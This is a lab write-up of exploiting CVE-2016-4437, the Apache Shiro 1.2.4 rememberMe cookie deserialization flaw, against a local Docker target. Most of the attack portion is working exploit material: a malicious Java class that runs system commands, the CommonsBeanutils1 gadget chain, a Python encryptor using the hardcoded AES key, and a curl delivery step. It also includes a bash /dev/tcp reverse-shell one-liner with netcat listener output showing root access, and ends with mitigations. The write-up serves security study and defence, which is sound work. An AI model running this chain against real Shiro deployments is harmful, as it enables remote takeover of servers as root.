# Lab Writeup: Apache Shiro 1.2.4 RememberMe Deserialization RCE (CVE-2016-4437)

> **Environment**: Local Docker lab (vulhub/shiro/CVE-2016-4437)  
> **Purpose**: Security research & exploit development practice  
> **Date**: 2026-05-16

---

## Overview

Apache Shiro ≤ 1.2.4 uses a hardcoded AES key to encrypt the `rememberMe` cookie. An attacker who knows this key can craft a malicious serialized Java object, encrypt it with the same key, and send it as the cookie value. The server deserializes the payload upon receipt, achieving Remote Code Execution (RCE).

| Item | Detail |
|------|--------|
| CVE | CVE-2016-4437 |
| CVSS | 8.1 (High) |
| Type | Java Deserialization (Hardcoded Cryptographic Key) |
| Affected | Apache Shiro ≤ 1.2.4 |
| Default Key | `kPH+bIxk5D2deZiIxcaaaA==` |
| Gadget Chain | CommonsBeanutils1 (bundled with Shiro) |

---

## Attack Chain

```
Fingerprinting → Confirm Shiro → Build CB1 Gadget → AES-CBC Encrypt → Send Cookie → RCE → Reverse Shell
```

---

## Step-by-Step Reproduction

### 1. Environment Setup

```bash
cd vulhub/shiro/CVE-2016-4437
docker compose up -d
# Target: http://127.0.0.1:8080
# Credentials: admin / vulhub
```

### 2. Fingerprinting — Identify Shiro

```bash
curl -sI http://127.0.0.1:8080/ -b "rememberMe=invalid_value"
```

**Key indicator**: Response contains `Set-Cookie: rememberMe=deleteMe`. This is Shiro's signature behavior — when it fails to decrypt/deserialize a rememberMe cookie, it responds with `deleteMe` to clear it.

### 3. Vulnerability Analysis

The vulnerability exists because:
1. Shiro 1.2.4 hardcodes the AES encryption key in source code
2. The `rememberMe` cookie value is: `Base64(IV + AES-CBC(serialized_object))`
3. Anyone with the key can encrypt arbitrary serialized objects
4. The server blindly deserializes whatever it decrypts

### 4. Payload Construction

#### 4.1 Compile Malicious Class

The payload leverages `TemplatesImpl` to load arbitrary bytecode. We create a class extending `AbstractTranslet` with a static initializer that executes system commands:

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class Evil extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec(
                new String[]{"/bin/bash", "-c", "id > /tmp/rce_proof.txt"});
        } catch (Exception e) {}
    }
    public void transform(DOM d, SerializationHandler[] h)
        throws TransletException {}
    public void transform(DOM d, DTMAxisIterator i, SerializationHandler h)
        throws TransletException {}
}
```

Compile with module exports (required for JDK 9+):
```bash
javac --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc=ALL-UNNAMED \
      --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
      --add-exports java.xml/com.sun.org.apache.xml.internal.dtm=ALL-UNNAMED \
      --add-exports java.xml/com.sun.org.apache.xml.internal.serializer=ALL-UNNAMED \
      Evil.java
```

**Important**: If compiling on JDK 11+, the resulting class file version will be too high for the target (Java 8). Patch the major version byte:

```python
data = bytearray(open('Evil.class', 'rb').read())
data[6:8] = (52).to_bytes(2, 'big')  # Java 8 = major version 52
open('Evil.class', 'wb').write(data)
```

#### 4.2 Build CommonsBeanutils1 Serialization Chain

The gadget chain is:
```
PriorityQueue.readObject()
  → BeanComparator.compare()
    → TemplatesImpl.getOutputProperties()
      → TemplatesImpl.newTransformer()
        → defineClass(Evil.class bytecode)
          → Evil.<clinit>() → Runtime.exec()
```

Generate using a helper class (requires `commons-beanutils-1.9.2.jar`):
```bash
java --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
     --add-opens java.base/java.util=ALL-UNNAMED \
     -cp "commons-beanutils-1.9.2.jar:commons-collections-3.2.1.jar:." \
     GenPayload Evil.class > payload.ser
```

#### 4.3 AES-CBC Encryption

```python
import base64, os
from Crypto.Cipher import AES

key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
payload = open("payload.ser", "rb").read()

# PKCS5 padding
bs = 16
padding = bs - len(payload) % bs
payload += bytes([padding] * padding)

# Encrypt
iv = os.urandom(16)
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = cipher.encrypt(payload)

# Final cookie value = Base64(IV + Ciphertext)
cookie = base64.b64encode(iv + encrypted).decode()
```

### 5. Exploitation

```bash
curl http://127.0.0.1:8080/ -b "rememberMe=$COOKIE_VALUE"
```

### 6. Verification

```bash
$ docker exec cve-2016-4437-web-1 cat /tmp/rce_proof.txt
uid=0(root) gid=0(root) groups=0(root)
```

**RCE confirmed** — command executed as root inside the container.

### 7. Reverse Shell (Optional)

```bash
# Attacker: start listener
nc -lvnp 7777

# Payload command (base64-encoded to avoid special char issues):
bash -i >& /dev/tcp/172.18.0.1/7777 0>&1
```

Result:
```
connect to [172.18.0.1] from (UNKNOWN) [172.18.0.2] 52516
root@ebdb3d463e42:/#
```

---

## Lessons Learned

| Issue | Root Cause | Solution |
|-------|-----------|----------|
| `deleteMe` in response | Normal — deserialization throws exception after exec | Check command output, not HTTP response |
| Class loading fails on target | Bytecode version mismatch (JDK 21 vs JDK 8) | Patch class file major version to 52 |
| `InaccessibleObjectException` | Java 9+ module system blocks reflection | Add `--add-opens` flags |
| HTTP requests fail | System proxy intercepts localhost | `unset http_proxy` |

---

## Mitigation

1. **Upgrade Shiro** to ≥ 1.2.5 (uses randomly generated key per deployment)
2. **Custom key**: Even on older versions, changing the default key defeats automated attacks
3. **WAF rule**: Flag `rememberMe` cookies > 500 characters (normal < 200, attack > 2000)
4. **Deserialization filter**: Use JEP 290 / SerialKiller to whitelist deserializable classes
5. **Least privilege**: Don't run application servers as root

---

## Tools & References

- [vulhub/shiro/CVE-2016-4437](https://github.com/vulhub/vulhub/tree/master/shiro/CVE-2016-4437)
- [ysoserial](https://github.com/frohoff/ysoserial) — Java deserialization gadget generator
- [NVD: CVE-2016-4437](https://nvd.nist.gov/vuln/detail/CVE-2016-4437)
- [Apache Shiro Security Advisory](https://shiro.apache.org/security-reports.html)

---

## Disclaimer

This writeup documents authorized security research conducted in an isolated local Docker environment. No production systems were targeted. The purpose is educational — understanding attack techniques to build better defenses.
